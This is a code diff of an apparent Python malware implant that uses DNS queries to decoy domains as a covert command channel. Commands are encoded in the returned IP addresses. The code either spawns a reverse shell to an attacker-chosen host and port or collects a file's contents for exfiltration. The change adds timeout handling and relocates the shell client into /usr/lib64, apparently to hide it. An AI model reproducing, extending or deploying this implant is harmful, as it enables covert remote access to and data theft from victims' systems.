@@ -106,7 +106,7 @@ def spawnRevShell(host, port):
         os.dup2(devnull, 1)
         os.dup2(devnull, 2)
 
-        cmd = ("python3", "shellClient.py", host, port)
+        cmd = ("python3", "/usr/lib64/shellClient.py", host, port)
         os.execvp(cmd[0], cmd)
     except Exception as e:
         os.write(2, ("exec failed: %s\n" % e).encode("utf-8"))
@@ -114,63 +114,68 @@ def spawnRevShell(host, port):
 
 sock = formSocket()
 sock.sendto(makeQuery("supportcenter.net"), (SERVER, 53))
-resp, _ = sock.recvfrom(512)
-
-ips = getResponse(resp)
-print("Resolved IPs:", ips)
+try:
+    resp, _ = sock.recvfrom(512)
+except socket.timeout:
+    pass
 
 time.sleep(WAIT_TIME)
 
 while True:
+    timeout = False
     sock.sendto(makeQuery("freegames.net"), (SERVER, 53))
-    resp, _ = sock.recvfrom(512)
+    try:
+        resp, _ = sock.recvfrom(512)
+    except socket.timeout:
+        timeout = True
+        pass
+    if not timeout:
+        ips = getResponse(resp)
+        print("Resolved IPs:", ips)
+        
+        if(len(ips) == 1):
+            ipSplit = ips[0].split('.')
+            if(ipSplit[3] == "232"): #ip of 100.100.100.100 with port 100 signals an error, stop process and sleep
+                print("Reverse Shell command recieved")
+                sock.sendto(makeQuery("securelogin.com"), (SERVER, 53))
+                resp, _ = sock.recvfrom(512)
 
-    ips = getResponse(resp)
-    print("Resolved IPs:", ips)
-    
-    if(len(ips) == 1):
-        ipSplit = ips[0].split('.')
-        if(ipSplit[3] == "232"): #ip of 100.100.100.100 with port 100 signals an error, stop process and sleep
-            print("Reverse Shell command recieved")
-            sock.sendto(makeQuery("securelogin.com"), (SERVER, 53))
-            resp, _ = sock.recvfrom(512)
-
-            ips = getResponse(resp)
-            
-            address = ips[0]
-            portIP = ips[1]
-            
-            portIPSplit = portIP.split('.')
-            port = int(portIPSplit[0]) + int(portIPSplit[1])
-            
-            if not ((address == "100.100.100.100") and (port == 100)):
-                print("Sending shell to " + address + ":" + str(port)) 
-                spawnRevShell(address, str(port))
-        elif(ipSplit[3] == "85"): 
-            print("Collecting file contents")
-            
-            sock.sendto(makeQuery("fileshare.org"), (SERVER, 53)) #Single IP ending in .100 signals an error, stop process and sleep
-            resp, _ = sock.recvfrom(512)
-
-            ips = getResponse(resp)
-            
-            if not ((len(ips) == 1) and ((ips[0].split('.'))[3] == "100")):
-                fileName = resolveFileName(ips)
+                ips = getResponse(resp)
                 
-            print("Accessing file: " + fileName)
-            
-            sock.sendto(makeQuery("cloudlogin.com"), (SERVER, 53)) #ip of 100.100.100.100 with port 100 signals an error, stop process and sleep
-            resp, _ = sock.recvfrom(512)
-            
-            ips = getResponse(resp)
-            
-            address = ips[0]
-            portIP = ips[1]
-            
-            portIPSplit = portIP.split('.')
-            port = int(portIPSplit[0]) + int(portIPSplit[1])
-            
-            if not ((address == "100.100.100.100") and (port == 100)):
-                print("Sending file contents to " + address + ":" + str(port)) 
-            
+                address = ips[0]
+                portIP = ips[1]
+                
+                portIPSplit = portIP.split('.')
+                port = int(portIPSplit[0]) + int(portIPSplit[1])
+                
+                if not ((address == "100.100.100.100") and (port == 100)):
+                    print("Sending shell to " + address + ":" + str(port)) 
+                    spawnRevShell(address, str(port))
+            elif(ipSplit[3] == "85"): 
+                print("Collecting file contents")
+                
+                sock.sendto(makeQuery("fileshare.org"), (SERVER, 53)) #Single IP ending in .100 signals an error, stop process and sleep
+                resp, _ = sock.recvfrom(512)
+
+                ips = getResponse(resp)
+                
+                if not ((len(ips) == 1) and ((ips[0].split('.'))[3] == "100")):
+                    fileName = resolveFileName(ips)
+                    
+                print("Accessing file: " + fileName)
+                
+                sock.sendto(makeQuery("cloudlogin.com"), (SERVER, 53)) #ip of 100.100.100.100 with port 100 signals an error, stop process and sleep
+                resp, _ = sock.recvfrom(512)
+                
+                ips = getResponse(resp)
+                
+                address = ips[0]
+                portIP = ips[1]
+                
+                portIPSplit = portIP.split('.')
+                port = int(portIPSplit[0]) + int(portIPSplit[1])
+                
+                if not ((address == "100.100.100.100") and (port == 100)):
+                    print("Sending file contents to " + address + ":" + str(port)) 
+                
     time.sleep(WAIT_TIME)
